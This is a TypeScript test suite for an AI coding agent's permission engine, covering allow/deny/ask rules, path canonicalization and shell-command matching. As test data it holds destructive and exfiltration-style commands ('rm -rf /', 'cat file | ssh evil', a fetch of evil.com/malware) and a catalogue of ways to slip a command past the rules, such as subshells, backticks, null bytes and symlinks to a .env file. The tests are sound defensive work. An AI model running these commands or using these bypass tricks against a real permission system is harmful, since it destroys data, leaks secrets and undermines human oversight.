import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
	canonicalizePath,
	EMPTY_CONFIG,
	type ExpansionVars,
	evaluate,
	expandVariables,
	extractAllAgentNames,
	extractToolInput,
	formatPermissionReason,
	globToRegExp,
	loadPermissionConfig,
	matchBashRule,
	matchDomainRule,
	matchMcpRule,
	matchPathRule,
	matchSubagentRule,
	mergePermissionConfigs,
	type PermissionConfig,
	parseRule,
	parseRules,
	redactSensitiveReasonText,
	resolvePathSpecifier,
} from "../permissions.js";

// ── Helpers ──────────────────────────────────────────────────────────────────

/** Raw temp dir (before realpathSync — may be /var on macOS). */
let rawTempDir: string;

/** Canonicalized temp dir (resolves /var → /private/var on macOS). */
let tempDir: string;

/** Original trust status env var restored after each test. */
let originalTrustStatus: string | undefined;

const defaultVars: ExpansionVars = {
	cwd: "/project",
	home: "/Users/kevin",
	project: "/project",
};

/**
 * Create a PermissionConfig from string arrays for concise test setup.
 *
 * @param opts - Allow/deny/ask rule string arrays
 * @returns Parsed PermissionConfig
 */
function makeConfig(opts: { allow?: string[]; deny?: string[]; ask?: string[] }): PermissionConfig {
	const warnings: string[] = [];
	return {
		allow: parseRules(opts.allow ?? [], warnings),
		deny: parseRules(opts.deny ?? [], warnings),
		ask: parseRules(opts.ask ?? [], warnings),
	};
}

beforeEach(() => {
	rawTempDir = mkdtempSync(join(tmpdir(), "perm-test-"));
	// Canonicalize to resolve macOS /var → /private/var symlink
	tempDir = realpathSync(rawTempDir);
	originalTrustStatus = process.env.TALLOW_PROJECT_TRUST_STATUS;
	process.env.TALLOW_PROJECT_TRUST_STATUS = "trusted";
});

afterEach(() => {
	if (originalTrustStatus !== undefined) {
		process.env.TALLOW_PROJECT_TRUST_STATUS = originalTrustStatus;
	} else {
		delete process.env.TALLOW_PROJECT_TRUST_STATUS;
	}
	rmSync(rawTempDir, { recursive: true, force: true });
});

// ── Rule Parsing ─────────────────────────────────────────────────────────────

describe("parseRule", () => {
	test('parses "Bash(npm *)" correctly', () => {
		const rule = parseRule("Bash(npm *)");
		expect(rule.tool).toBe("bash");
		expect(rule.specifier).toBe("npm *");
		expect(rule.raw).toBe("Bash(npm *)");
	});

	test('parses bare "Read" correctly', () => {
		const rule = parseRule("Read");
		expect(rule.tool).toBe("read");
		expect(rule.specifier).toBeNull();
	});

	test('parses "WebFetch(domain:example.com)" correctly', () => {
		const rule = parseRule("WebFetch(domain:example.com)");
		expect(rule.tool).toBe("web_fetch");
		expect(rule.specifier).toBe("domain:example.com");
	});

	test('parses "Task(Explore)" correctly', () => {
		const rule = parseRule("Task(Explore)");
		expect(rule.tool).toBe("subagent");
		expect(rule.specifier).toBe("Explore");
	});

	test("normalizes Bash → bash", () => {
		expect(parseRule("Bash").tool).toBe("bash");
		expect(parseRule("bash").tool).toBe("bash");
		expect(parseRule("BASH").tool).toBe("bash");
	});

	test("normalizes WebFetch → web_fetch", () => {
		expect(parseRule("WebFetch").tool).toBe("web_fetch");
	});

	test('treats "Bash(*)" same as bare "Bash"', () => {
		const withStar = parseRule("Bash(*)");
		expect(withStar.tool).toBe("bash");
		expect(withStar.specifier).toBe("*");

		const bare = parseRule("Bash");
		expect(bare.tool).toBe("bash");
		expect(bare.specifier).toBeNull();
	});

	test("treats empty parens as bare tool name", () => {
		const rule = parseRule("Bash()");
		expect(rule.tool).toBe("bash");
		expect(rule.specifier).toBeNull();
	});
});

describe("malformed rule parsing", () => {
	test('unclosed paren "Bash(" throws', () => {
		expect(() => parseRule("Bash(")).toThrow(/unclosed parenthesis/i);
	});

	test('no tool name "(npm *)" throws', () => {
		expect(() => parseRule("(npm *)")).toThrow(/missing tool name/i);
	});

	test("empty string throws", () => {
		expect(() => parseRule("")).toThrow(/empty/i);
	});

	test('just parens "()" throws', () => {
		expect(() => parseRule("()")).toThrow(/missing tool name/i);
	});

	test("unknown tool name parses without error", () => {
		const rule = parseRule("FooBar(x)");
		expect(rule.tool).toBe("foobar");
		expect(rule.specifier).toBe("x");
	});

	test("non-string entries are skipped in parseRules", () => {
		const warnings: string[] = [];
		const rules = parseRules([42, null, true, "Bash(npm *)"] as unknown[], warnings);
		expect(rules).toHaveLength(1);
		expect(rules[0].tool).toBe("bash");
		expect(warnings).toHaveLength(3);
	});

	test("mixed valid + invalid rules: valid rules still apply", () => {
		const warnings: string[] = [];
		const rules = parseRules(["Bash(npm *)", "Bash(", "Read"], warnings);
		expect(rules).toHaveLength(2);
		expect(rules[0].specifier).toBe("npm *");
		expect(rules[1].tool).toBe("read");
		expect(warnings).toHaveLength(1);
	});
});

// ── Tier Resolution ──────────────────────────────────────────────────────────

describe("tier resolution", () => {
	test("empty config allows everything", () => {
		const result = evaluate("bash", { command: "anything" }, EMPTY_CONFIG, defaultVars, "/");
		expect(result.action).toBe("default");
		expect(result.allowed).toBe(true);
	});

	test("deny pattern blocks tool", () => {
		const config = makeConfig({ deny: ["Read(./.env)"] });
		const result = evaluate(
			"read",
			{ path: "./.env" },
			config,
			{ ...defaultVars, cwd: tempDir },
			tempDir
		);
		expect(result.action).toBe("deny");
		expect(result.allowed).toBe(false);
	});

	test("allow pattern permits tool", () => {
		const config = makeConfig({ allow: ["Bash(npm *)"] });
		const result = evaluate("bash", { command: "npm run build" }, config, defaultVars, "/");
		expect(result.action).toBe("allow");
		expect(result.allowed).toBe(true);
	});

	test("ask pattern returns ask", () => {
		const config = makeConfig({ ask: ["Bash(docker *)"] });
		const result = evaluate("bash", { command: "docker compose up" }, config, defaultVars, "/");
		expect(result.action).toBe("ask");
		expect(result.allowed).toBe(false);
	});

	test("ask verdict includes remediation hints when available", () => {
		const config = makeConfig({
			allow: ["Bash(npm *)"],
			ask: ["Bash(docker *)"],
		});
		const result = evaluate("bash", { command: "docker compose up" }, config, defaultVars, "/");
		expect(result.reasonCode).toBe("rule_requires_confirmation");
		expect((result.remediationHints ?? []).length).toBeGreaterThan(0);
		expect((result.remediationHints ?? []).join(" ")).toContain("Allowed patterns");
	});

	test("deny beats allow", () => {
		const config = makeConfig({
			allow: ["Bash(*)"],
			deny: ["Bash(ssh *)"],
		});
		const result = evaluate("bash", { command: "ssh root@host" }, config, defaultVars, "/");
		expect(result.action).toBe("deny");
		expect(result.allowed).toBe(false);
	});

	test("deny beats ask", () => {
		const config = makeConfig({
			ask: ["Bash(*)"],
			deny: ["Bash(ssh *)"],
		});
		const result = evaluate("bash", { command: "ssh root@host" }, config, defaultVars, "/");
		expect(result.action).toBe("deny");
	});

	test("ask beats allow", () => {
		const config = makeConfig({
			allow: ["Bash(*)"],
			ask: ["Bash(docker *)"],
		});
		const result = evaluate("bash", { command: "docker build ." }, config, defaultVars, "/");
		expect(result.action).toBe("ask");
	});

	test("allow-only mode: unlisted tool returns default", () => {
		const config = makeConfig({ allow: ["Bash(npm *)"] });
		const result = evaluate("bash", { command: "ssh evil" }, config, defaultVars, "/");
		expect(result.action).toBe("default");
		expect(result.reasonCode).toBe("allowlist_unmatched");
	});

	test("verdict includes structured reason metadata", () => {
		const config = makeConfig({ deny: ["Bash(ssh *)"] });
		const result = evaluate("bash", { command: "ssh root@host" }, config, defaultVars, "/");
		expect(result.matchedRule).toBe("Bash(ssh *)");
		expect(result.reasonCode).toBe("rule_denied");
		expect(result.reasonMessage).toContain("Action denied");
		expect(result.reason).toContain("permission rule");
	});
});

// ── Reason Formatting and Redaction ─────────────────────────────────────────

describe("reason formatting and redaction", () => {
	test("redacts sensitive assignments in reason text", () => {
		const redacted = redactSensitiveReasonText("Bash(export API_KEY=abc123secret)");
		expect(redacted).toContain("API_KEY=[REDACTED]");
		expect(redacted).not.toContain("abc123secret");
	});

	test("formats source context and hints", () => {
		const message = formatPermissionReason({
			action: "deny",
			allowed: false,
			reasonMessage: "Action denied by policy",
			remediationHints: ["Use read instead."],
			sourcePath: "/tmp/project/.tallow/settings.json",
		});
		expect(message).toContain("Action denied by policy");
		expect(message).toContain(".tallow/settings.json");
		expect(message).toContain("Hint: Use read instead.");
	});

	test("evaluate redacts sensitive values in matched rule", () => {
		const config = makeConfig({ deny: ["Bash(export API_KEY=*)"] });
		const result = evaluate(
			"bash",
			{ command: "export API_KEY=supersecret" },
			config,
			defaultVars,
			"/"
		);
		expect(result.action).toBe("deny");
		expect(result.matchedRule).toContain("API_KEY=[REDACTED]");
		expect(result.matchedRule).not.toContain("supersecret");
	});
});

// ── Variable Expansion ───────────────────────────────────────────────────────

describe("variable expansion", () => {
	test("{cwd} expands in path", () => {
		const result = expandVariables("{cwd}/src/**", defaultVars);
		expect(result).toBe("/project/src/**");
	});

	test("{home} expands in path", () => {
		const result = expandVariables("{home}/.env", defaultVars);
		expect(result).toBe("/Users/kevin/.env");
	});

	test("{project} expands in path", () => {
		const result = expandVariables("{project}/src/**", defaultVars);
		expect(result).toBe("/project/src/**");
	});

	test("{cwd} works in Bash rules", () => {
		const config = makeConfig({ allow: ["Bash({cwd}/scripts/*)"] });
		const vars = { ...defaultVars, cwd: "/myproject" };
		const result = evaluate("bash", { command: "/myproject/scripts/build.sh" }, config, vars, "/");
		expect(result.action).toBe("allow");
	});

	test("unknown variable {foo} left as literal", () => {
		const result = expandVariables("{foo}/bar", defaultVars);
		expect(result).toBe("{foo}/bar");
	});

	test("multiple variables in one pattern", () => {
		const result = expandVariables("{home}/{cwd}/file", defaultVars);
		expect(result).toBe("/Users/kevin//project/file");
	});
});

// ── Path Resolution ──────────────────────────────────────────────────────────

describe("path resolution", () => {
	test("// resolves to absolute path", () => {
		const result = resolvePathSpecifier("//etc/passwd", "/settings", defaultVars);
		expect(result).toBe("/etc/passwd");
	});

	test("~/ resolves to home-relative path", () => {
		const result = resolvePathSpecifier("~/.zshrc", "/settings", defaultVars);
		expect(result).toBe("/Users/kevin/.zshrc");
	});

	test("/ resolves relative to settings dir", () => {
		const result = resolvePathSpecifier("/src/**/*.ts", "/project/.tallow", defaultVars);
		expect(result).toBe("/project/.tallow/src/**/*.ts");
	});

	test("./ resolves relative to cwd", () => {
		const result = resolvePathSpecifier("./.env", "/settings", defaultVars);
		expect(result).toBe("/project/.env");
	});

	test("bare path resolves relative to cwd", () => {
		const result = resolvePathSpecifier("*.env", "/settings", defaultVars);
		expect(result).toBe("/project/*.env");
	});

	test("* matches single level only", () => {
		expect(matchPathRule("/src/index.ts", "/src/*.ts")).toBe(true);
		expect(matchPathRule("/src/lib/util.ts", "/src/*.ts")).toBe(false);
	});

	test("** matches recursively", () => {
		expect(matchPathRule("/src/lib/deep/util.ts", "/src/**/*.ts")).toBe(true);
		expect(matchPathRule("/src/index.ts", "/src/**/*.ts")).toBe(true);
	});
});

// ── Symlink and Path Traversal ───────────────────────────────────────────────

describe("symlink and path traversal", () => {
	test("path traversal ./src/../.env is canonicalized", () => {
		const canonical = canonicalizePath("./src/../.env", "/project");
		expect(canonical).toBe("/project/.env");
	});

	test("double traversal ./a/b/../../.env is canonicalized", () => {
		const canonical = canonicalizePath("./a/b/../../.env", "/project");
		expect(canonical).toBe("/project/.env");
	});

	test("absolute path to same file is caught", () => {
		const config = makeConfig({ deny: ["Edit(./.env)"] });
		const vars = { ...defaultVars, cwd: tempDir };

		// Write a real file so canonicalization works
		writeFileSync(join(tempDir, ".env"), "SECRET=xxx");

		const result = evaluate("edit", { path: join(tempDir, ".env") }, config, vars, tempDir);
		expect(result.action).toBe("deny");
	});

	test("symlink to denied file is blocked", () => {
		// Create the target file and a symlink
		writeFileSync(join(tempDir, ".env"), "SECRET=xxx");
		symlinkSync(join(tempDir, ".env"), join(tempDir, "safe-link"));

		const config = makeConfig({ deny: ["Edit(./.env)"] });
		const vars = { ...defaultVars, cwd: tempDir };

		const result = evaluate("edit", { path: join(tempDir, "safe-link") }, config, vars, tempDir);
		expect(result.action).toBe("deny");
	});

	test("redundant slashes are normalized", () => {
		const canonical = canonicalizePath("./src//index.ts", "/project");
		expect(canonical).toBe("/project/src/index.ts");
	});

	test("traversal blocked by deny rule", () => {
		const config = makeConfig({ deny: ["Edit(./.env)"] });
		const vars = { ...defaultVars, cwd: tempDir };
		writeFileSync(join(tempDir, ".env"), "SECRET");

		const result = evaluate("edit", { path: "./src/../.env" }, config, vars, tempDir);
		expect(result.action).toBe("deny");
	});
});

// ── Shell Command Matching ───────────────────────────────────────────────────

describe("shell command matching", () => {
	test("&& operator split: deny blocks", () => {
		expect(matchBashRule("git status && rm -rf /", "rm *", "deny")).toBe(true);
	});

	test("|| operator split: deny blocks", () => {
		expect(matchBashRule("git status || ssh evil", "ssh *", "deny")).toBe(true);
	});

	test("; operator split: deny blocks", () => {
		expect(matchBashRule("echo hi; ssh evil", "ssh *", "deny")).toBe(true);
	});

	test("| pipe split: deny blocks", () => {
		expect(matchBashRule("cat file | ssh evil", "ssh *", "deny")).toBe(true);
	});

	test("word boundary: ls * matches ls -la", () => {
		expect(matchBashRule("ls -la", "ls *", "allow")).toBe(true);
	});

	test("word boundary: ls * does NOT match lsof", () => {
		expect(matchBashRule("lsof", "ls *", "allow")).toBe(false);
	});

	test("no word boundary: ls* matches lsof", () => {
		expect(matchBashRule("lsof", "ls*", "allow")).toBe(true);
	});

	test("git * matches git commit -m hello", () => {
		expect(matchBashRule('git commit -m "hello"', "git *", "allow")).toBe(true);
	});

	test("git * does NOT match gitk", () => {
		expect(matchBashRule("gitk", "git *", "allow")).toBe(false);
	});
});

describe("shell encoding/escaping bypass vectors", () => {
	test("newline-separated commands: deny blocks", () => {
		expect(matchBashRule("echo hi\nssh evil", "ssh *", "deny")).toBe(true);
	});

	test("subshell parentheses: deny blocks", () => {
		expect(matchBashRule("(ssh evil)", "ssh *", "deny")).toBe(true);
	});

	test("brace group: deny blocks", () => {
		expect(matchBashRule("{ ssh evil; }", "ssh *", "deny")).toBe(true);
	});

	test("background operator: deny blocks", () => {
		expect(matchBashRule("ssh evil &", "ssh *", "deny")).toBe(true);
	});

	test("command substitution backtick: deny blocks", () => {
		expect(matchBashRule("`ssh evil`", "ssh *", "deny")).toBe(true);
	});

	test("command substitution $(): deny blocks", () => {
		expect(matchBashRule("$(ssh evil)", "ssh *", "deny")).toBe(true);
	});

	test("command substitution blocks allow (fail-closed)", () => {
		expect(matchBashRule("$(ssh evil)", "ssh *", "allow")).toBe(false);
	});

	test("null bytes stripped before matching", () => {
		expect(matchBashRule("ss\x00h evil", "ssh *", "deny")).toBe(true);
	});

	test("quoted operator is NOT a real operator", () => {
		// "echo 'git && rm -rf /'" — the && is inside quotes, inert
		expect(matchBashRule("echo 'git && rm -rf /'", "rm *", "deny")).toBe(false);
	});

	test("allow requires all segments to match", () => {
		expect(matchBashRule("git status && npm test", "git *", "allow")).toBe(false);
		expect(matchBashRule("git status && git log", "git *", "allow")).toBe(true);
	});
});

// ── WebFetch Domain Matching ─────────────────────────────────────────────────

describe("WebFetch domain matching", () => {
	test("exact domain match", () => {
		expect(matchDomainRule("https://example.com/page", "domain:example.com")).toBe(true);
	});

	test("subdomain does NOT match by default", () => {
		expect(matchDomainRule("https://api.example.com", "domain:example.com")).toBe(false);
	});

	test("wildcard subdomain", () => {
		expect(matchDomainRule("https://api.example.com", "domain:*.example.com")).toBe(true);
	});

	test("port ignored in domain check", () => {
		expect(matchDomainRule("https://example.com:8080/", "domain:example.com")).toBe(true);
	});

	test("protocol irrelevant", () => {
		expect(matchDomainRule("http://example.com", "domain:example.com")).toBe(true);
		expect(matchDomainRule("https://example.com", "domain:example.com")).toBe(true);
	});

	test("IP address", () => {
		expect(matchDomainRule("http://127.0.0.1/path", "domain:127.0.0.1")).toBe(true);
	});

	test("URL without protocol", () => {
		expect(matchDomainRule("example.com/path", "domain:example.com")).toBe(true);
	});

	test("malformed URL: no match, no crash", () => {
		expect(matchDomainRule("not-a-url", "domain:example.com")).toBe(false);
	});
});

// ── MCP Tool Matching ────────────────────────────────────────────────────────

describe("MCP tool matching", () => {
	test("exact match", () => {
		expect(matchMcpRule("mcp__puppeteer__navigate", "mcp__puppeteer__navigate")).toBe(true);
	});

	test("server wildcard", () => {
		expect(matchMcpRule("mcp__puppeteer__navigate", "mcp__puppeteer__*")).toBe(true);
	});

	test("all MCP wildcard", () => {
		expect(matchMcpRule("mcp__puppeteer__navigate", "mcp__*")).toBe(true);
	});

	test("non-MCP tool not matched", () => {
		expect(matchMcpRule("bash", "mcp__*")).toBe(false);
	});
});

// ── Subagent Task() Matching ─────────────────────────────────────────────────

describe("subagent Task() matching", () => {
	test("exact name match", () => {
		expect(matchSubagentRule("Explore", "Explore")).toBe(true);
	});

	test("case sensitivity", () => {
		expect(matchSubagentRule("Explore", "explore")).toBe(false);
	});

	test("wildcard matches all", () => {
		expect(matchSubagentRule("Explore", "*")).toBe(true);
	});

	test("glob pattern", () => {
		expect(matchSubagentRule("my-custom-agent", "my-*")).toBe(true);
		expect(matchSubagentRule("other-agent", "my-*")).toBe(false);
	});
});

// ── Config Merge and Precedence ──────────────────────────────────────────────

describe("config merge and precedence", () => {
	test("project deny + user allow: deny wins", () => {
		const projectConfig = makeConfig({ deny: ["Bash(ssh *)"] });
		const userConfig = makeConfig({ allow: ["Bash(ssh *)"] });
		const merged = mergePermissionConfigs(projectConfig, userConfig);

		const result = evaluate("bash", { command: "ssh root@host" }, merged, defaultVars, "/");
		expect(result.action).toBe("deny");
	});

	test("cross-source casing: both normalized", () => {
		const claude = makeConfig({ deny: ["Bash(ssh *)"] });
		const tallow = makeConfig({ allow: ["bash(npm *)"] });
		const merged = mergePermissionConfigs(claude, tallow);

		expect(merged.deny[0].tool).toBe("bash");
		expect(merged.allow[0].tool).toBe("bash");
	});
});

// ── extractToolInput ─────────────────────────────────────────────────────────

describe("extractToolInput", () => {
	test("extracts bash command", () => {
		const result = extractToolInput("bash", { command: "npm test" });
		expect(result).toEqual({ kind: "command", value: "npm test" });
	});

	test("extracts read path", () => {
		const result = extractToolInput("read", { path: "/src/index.ts" });
		expect(result).toEqual({ kind: "path", value: "/src/index.ts" });
	});

	test("extracts web_fetch domain", () => {
		const result = extractToolInput("web_fetch", { url: "https://example.com" });
		expect(result).toEqual({ kind: "domain", value: "https://example.com" });
	});

	test("extracts subagent name", () => {
		const result = extractToolInput("subagent", { agent: "Explore" });
		expect(result).toEqual({ kind: "agent", value: "Explore" });
	});

	test("extracts MCP tool", () => {
		const result = extractToolInput("mcp__puppeteer__navigate", { url: "https://x.com" });
		expect(result).toEqual({ kind: "mcp", value: "mcp__puppeteer__navigate" });
	});
});

// ── extractAllAgentNames ─────────────────────────────────────────────────────

describe("extractAllAgentNames", () => {
	test("single mode", () => {
		expect(extractAllAgentNames({ agent: "Explore" })).toEqual(["Explore"]);
	});

	test("parallel mode", () => {
		const input = { tasks: [{ agent: "A" }, { agent: "B" }] };
		expect(extractAllAgentNames(input)).toEqual(["A", "B"]);
	});

	test("centipede mode", () => {
		const input = { centipede: [{ agent: "X" }, { agent: "Y" }] };
		expect(extractAllAgentNames(input)).toEqual(["X", "Y"]);
	});

	test("empty input returns empty", () => {
		expect(extractAllAgentNames({})).toEqual([]);
	});
});

// ── Glob Matching ────────────────────────────────────────────────────────────

describe("globToRegExp", () => {
	test("* matches single level", () => {
		const re = globToRegExp("/src/*.ts");
		expect(re.test("/src/index.ts")).toBe(true);
		expect(re.test("/src/lib/util.ts")).toBe(false);
	});

	test("** matches recursively", () => {
		const re = globToRegExp("/src/**/*.ts");
		expect(re.test("/src/index.ts")).toBe(true);
		expect(re.test("/src/lib/deep/util.ts")).toBe(true);
	});

	test("literal match", () => {
		const re = globToRegExp("/src/index.ts");
		expect(re.test("/src/index.ts")).toBe(true);
		expect(re.test("/src/other.ts")).toBe(false);
	});

	test("? matches single character", () => {
		const re = globToRegExp("/src/?.ts");
		expect(re.test("/src/a.ts")).toBe(true);
		expect(re.test("/src/ab.ts")).toBe(false);
	});
});

// ── loadPermissionConfig ─────────────────────────────────────────────────────

describe("loadPermissionConfig", () => {
	test("no config files returns empty config", () => {
		const { loaded, warnings } = loadPermissionConfig(tempDir);
		expect(loaded.merged.allow).toHaveLength(0);
		expect(loaded.merged.deny).toHaveLength(0);
		expect(loaded.merged.ask).toHaveLength(0);
		expect(loaded.sources).toHaveLength(0);
		expect(warnings).toHaveLength(0);
	});

	test("reads .tallow/settings.json permissions", () => {
		mkdirSync(join(tempDir, ".tallow"), { recursive: true });
		writeFileSync(
			join(tempDir, ".tallow", "settings.json"),
			JSON.stringify({
				permissions: {
					deny: ["Bash(ssh *)"],
					allow: ["Bash(npm *)"],
				},
			})
		);

		const { loaded } = loadPermissionConfig(tempDir);
		expect(loaded.merged.deny).toHaveLength(1);
		expect(loaded.merged.deny[0].tool).toBe("bash");
		expect(loaded.merged.deny[0].sourcePath).toContain(".tallow/settings.json");
		expect(loaded.merged.deny[0].sourceScope).toBe("project-shared");
		expect(loaded.merged.allow).toHaveLength(1);
	});

	test("reads .claude/settings.json permissions", () => {
		mkdirSync(join(tempDir, ".claude"), { recursive: true });
		writeFileSync(
			join(tempDir, ".claude", "settings.json"),
			JSON.stringify({
				permissions: {
					deny: ["Bash(ssh *)"],
				},
			})
		);

		const { loaded } = loadPermissionConfig(tempDir);
		expect(loaded.merged.deny).toHaveLength(1);
		expect(loaded.sources[0].path).toContain(".claude");
	});

	test("invalid permissions type produces warning", () => {
		mkdirSync(join(tempDir, ".tallow"), { recursive: true });
		writeFileSync(
			join(tempDir, ".tallow", "settings.json"),
			JSON.stringify({ permissions: "oops" })
		);

		const { loaded, warnings } = loadPermissionConfig(tempDir);
		expect(loaded.merged.deny).toHaveLength(0);
		expect(warnings.length).toBeGreaterThan(0);
	});

	test("invalid allow type produces warning", () => {
		mkdirSync(join(tempDir, ".tallow"), { recursive: true });
		writeFileSync(
			join(tempDir, ".tallow", "settings.json"),
			JSON.stringify({ permissions: { allow: "not-array" } })
		);

		const { loaded, warnings } = loadPermissionConfig(tempDir);
		expect(loaded.merged.allow).toHaveLength(0);
		expect(warnings.length).toBeGreaterThan(0);
	});

	test("untrusted projects ignore .tallow permission sources", () => {
		mkdirSync(join(tempDir, ".tallow"), { recursive: true });
		writeFileSync(
			join(tempDir, ".tallow", "settings.json"),
			JSON.stringify({ permissions: { deny: ["Bash(ssh *)"] } })
		);

		process.env.TALLOW_PROJECT_TRUST_STATUS = "untrusted";
		const { loaded } = loadPermissionConfig(tempDir);
		expect(loaded.merged.deny).toHaveLength(0);
		expect(loaded.sources.some((s) => s.path.includes(".tallow/settings.json"))).toBe(false);
	});

	test("stale trust blocks project-local .tallow permissions", () => {
		mkdirSync(join(tempDir, ".tallow"), { recursive: true });
		writeFileSync(
			join(tempDir, ".tallow", "settings.local.json"),
			JSON.stringify({ permissions: { deny: ["Bash(ssh *)"] } })
		);

		process.env.TALLOW_PROJECT_TRUST_STATUS = "stale_fingerprint";
		const { loaded } = loadPermissionConfig(tempDir);
		expect(loaded.merged.deny).toHaveLength(0);
		expect(loaded.sources.some((s) => s.path.includes(".tallow/settings.local.json"))).toBe(false);
	});

	test("CLI config takes precedence", () => {
		const cliConfig = makeConfig({ deny: ["Bash(*)"] });
		const { loaded } = loadPermissionConfig(tempDir, cliConfig);
		expect(loaded.sources[0].tier).toBe("cli");
		expect(loaded.merged.deny).toHaveLength(1);
		expect(loaded.merged.deny[0].sourcePath).toBe("<cli>");
		expect(loaded.merged.deny[0].sourceScope).toBe("cli");
	});
});

// ── Full Evaluation Integration ──────────────────────────────────────────────

describe("full evaluation scenarios", () => {
	test("bare tool deny blocks all uses", () => {
		const config = makeConfig({ deny: ["Read"] });
		const result = evaluate("read", { path: "/any/file.ts" }, config, defaultVars, "/");
		expect(result.action).toBe("deny");
	});

	test("MCP glob deny blocks MCP tool", () => {
		const config = makeConfig({ deny: ["mcp__puppeteer__*"] });
		const result = evaluate(
			"mcp__puppeteer__navigate",
			{ url: "https://x.com" },
			config,
			defaultVars,
			"/"
		);
		expect(result.action).toBe("deny");
	});

	test("Task deny blocks subagent", () => {
		const config = makeConfig({ deny: ["Task(Explore)"] });
		const result = evaluate("subagent", { agent: "Explore" }, config, defaultVars, "/");
		expect(result.action).toBe("deny");
	});

	test("Task deny in parallel mode blocks matching agent", () => {
		const config = makeConfig({ deny: ["Task(Explore)"] });
		const result = evaluate(
			"subagent",
			{ tasks: [{ agent: "Explore" }, { agent: "Plan" }] },
			config,
			defaultVars,
			"/"
		);
		expect(result.action).toBe("deny");
	});

	test("WebFetch domain deny blocks fetch", () => {
		const config = makeConfig({ deny: ["WebFetch(domain:evil.com)"] });
		const result = evaluate(
			"web_fetch",
			{ url: "https://evil.com/malware" },
			config,
			defaultVars,
			"/"
		);
		expect(result.action).toBe("deny");
	});

	test("Claude Code casing works: Bash and bash equivalent", () => {
		const config1 = makeConfig({ deny: ["Bash(ssh *)"] });
		const config2 = makeConfig({ deny: ["bash(ssh *)"] });

		const result1 = evaluate("bash", { command: "ssh evil" }, config1, defaultVars, "/");
		const result2 = evaluate("bash", { command: "ssh evil" }, config2, defaultVars, "/");

		expect(result1.action).toBe("deny");
		expect(result2.action).toBe("deny");
	});

	test("unknown tool in config never matches real tools", () => {
		const config = makeConfig({ deny: ["FooBar(*)"] });
		const result = evaluate("bash", { command: "anything" }, config, defaultVars, "/");
		expect(result.action).toBe("default");
	});
});
